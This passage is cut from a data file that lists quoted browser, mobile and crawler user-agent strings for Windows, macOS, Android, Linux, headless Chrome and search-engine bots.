  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T217S Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Linux; Android 4.4.2; RCT6203W46 Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E)",
  "Mozilla/5.0 (Android; Tablet; rv:34.0) Gecko/34.0 Firefox/34.0",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/6.0; Touch)",
  "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; WOW64; Trident/7.0; TNJB; 1ButtonTaskbar)",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0)",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV400 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.0.4; BNTV600 Build/IMM76L) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.111 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T237P Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 4.4.2; SM-T530NU Build/KOT49H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0.1; SCH-I545 Build/LRX22C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.84 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.0; SAMSUNG SM-N900T Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-G920T Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/3.2 Chrome/38.0.2125.102 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; Android 5.1.1; SAMSUNG SM-N910P Build/LMY47X) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/2.1 Chrome/34.0.1847.76 Mobile Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.2; en-us; LG-V410/V41010d Build/KOT49I.V41010d) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.1599.103 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFARWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Linux; U; Android 4.4.3; en-us; KFSAWI Build/KTU84M) AppleWebKit/537.36 (KHTML, like Gecko) Silk/3.68 like Chrome/39.0.2171.93 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.130 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.85 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/8.0.6 Safari/600.6.3",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.107 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36 OPR/31.0.1889.174",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/47.0.2503.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/601.1.56 (KHTML, like Gecko) Version/9.0 Safari/601.1.56",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.135 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.81 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/600.6.3 (KHTML, like Gecko) Version/7.1.6 Safari/537.85.15",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; Touch; MDDCJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.155 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Windows NT 6.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4049.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0",
  "Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.154 Safari/537.36 LBBROWSER",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.132 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.1000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; ASJB; ASJB; MAAU; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; BOIE9;ENUSSEM; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; MDDRJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:29.0) Gecko/20100101 Firefox/29.0",
  "Mozilla/5.0 (Windows NT 6.2; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Windows NT 6.3; Trident/7.0; Touch; TNJB; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; MALNJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64; Trident/7.0; Touch; MASMJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.104 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.125 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Maxthon/4.4.6.2000 Chrome/30.0.1599.101 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; MAARJS; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; Touch; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows; U; Windows NT 6.1; zh-CN; rv:1.9.0.8) Gecko/2009032609 Firefox/3.0.8 (.NET CLR 3.5.30729)",
  "Mozilla/5.0 (X11; CrOS x86_64 6457.107.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36",
  "Mozilla/5.0 (X11; CrOS x86_64 7077.95.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.90 Safari/537.36",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (X11; Linux i686; rv:40.0) Gecko/20100101 Firefox/40.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/33.0.0.0 Safari/534.24",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/34.0.1847.76 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.102 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.134 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.94 Chrome/37.0.2062.94 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/11.1.2",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_6; en-en) AppleWebKit/533.19.4 (KHTML, like Gecko) Version/5.0.3 Safari/533.19.4",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/603.3.8 (KHTML, like Gecko) Version/10.1.2 Safari/603.3.8",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_6_8) AppleWebKit/534.59.10 (KHTML, like Gecko) Version/5.1.9 Safari/534.59.10",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.75.14 (KHTML, like Gecko) Version/7.0.3 Safari/E7FBAF",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.8 (KHTML, like Gecko)",
  "Mac OS X/10.6.8 (10K549); ExchangeWebServices/1.3 (61); Mail/4.6 (1085)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_4; de-de) AppleWebKit/525.18 (KHTML, like Gecko) Version/3.1.2 Safari/525.20.1",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_5) AppleWebKit/600.8.9 (KHTML, like Gecko)",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_5) AppleWebKit/601.7.8 (KHTML, like Gecko) Version/9.1.3 Safari/537.86.7",
  "MacOutlook/0.0.0.150815 (Intel Mac OS X Version 10.10.5 (Build 14F27))",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:28.0) Gecko/20100101 Firefox/28.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:34.0) Gecko/20100101 Firefox/34.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.7; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.9; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:51.0) Gecko/20100101 Firefox/51.0",
  "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10.4; en-US; rv:1.9.0.5) Gecko/2008120121 Firefox/3.0.5",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.124 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:52.0) Gecko/20100101 Firefox/52.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/35.0.1916.153 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.8; rv:38.0) Gecko/20100101 Firefox/38.0",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 CK={} (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.157 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/17.17134",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.17763",
  "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; KTXN)",
  "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:54.0) Gecko/20100101 Firefox/54.0",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0)",
  "Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)",
  "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; 125LA; .NET CLR 2.0.50727; .NET CLR 3.0.04506.648; .NET CLR 3.5.21022)",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18362",
  "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)",
  "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.83 Safari/537.1",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36 Edge/18.18363",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.141 Safari/537.36 Edg/87.0.664.75",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.2; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.105 Safari/537.36",
  "Mozilla/4.0 (compatible; MSIE 6.0; Windows 98)",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36 Edge/15.15063",
  "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36",
  "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36",
  "Mozilla/5.0 (Windows NT 5.1; rv:36.0) Gecko/20100101 Firefox/36.0",
  "Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
  "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
  "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
  "Mozilla/5.0 (compatible; MJ12bot/v1.4.5; http://www.majestic12.co.uk/bot.php?+)",
  "Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
  "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
  "facebookexternalhit/1.1 (+http://www.facebook.com/externalhit_uatext.php)",
  "Mozilla/5.0 (Windows; U; Windows NT 5.1; fr; rv:1.8.1) VoilaBot BETA 1.2 (support.voilabot@orange-ftgroup.com)",
  "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://aspiegel.com/petalbot)",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/44.0.2403.157 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:24.0) Gecko/20100101 Firefox/24.0",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.7.5) Gecko/20041107 Firefox/1.0",
  "Mozilla/5.0 (X11; Linux i686; rv:5.0) Gecko/20100101 Firefox/5.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.24 (KHTML, like Gecko) Chrome/71.0.3578.141 Safari/534.24 XiaoMi/MiuiBrowser/12.4.3-g",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/69.0.3497.81 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:12.0) Gecko/20100101 Firefox/12.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.89 Safari/537.36",
  "Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.8.0.1) Gecko/20060124 Firefox/1.5.0.1",
  "Mozilla/5.0 (X11; Linux x86_64; rv:67.0) Gecko/20100101 Firefox/67.0",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/53.0.2785.143 Chrome/53.0.2785.143 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.72 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:46.0) Gecko/20100101 Firefox/46.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/80.0.3987.87 Chrome/80.0.3987.87 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.109 Safari/537.36",
  "Mozilla/5.0 (X11; Linux i686) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/37.0.2062.120 Chrome/37.0.2062.120 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.116 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:53.0) Gecko/20100101 Firefox/53.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/76.0.3809.100 Chrome/76.0.3809.100 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Ubuntu Chromium/49.0.2623.108 Chrome/49.0.2623.108 Safari/537.36",
  "Wget/1.17.1 (linux-gnu)",
  "Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:44.0) Gecko/20100101 Firefox/44.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:33.0) Gecko/20100101 Firefox/33.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64; rv:41.0) Gecko/20100101 Firefox/41.0",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:10.0) Gecko/20100101 Firefox/10.0",
  "Mozilla/5.0 (X11; Linux x86_64; rv:37.0) Gecko/20100101 Firefox/37.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/79.0.3945.0 Safari/537.36",
  "Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:59.0) Gecko/20100101 Firefox/59.0",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.62 Safari/537.36",
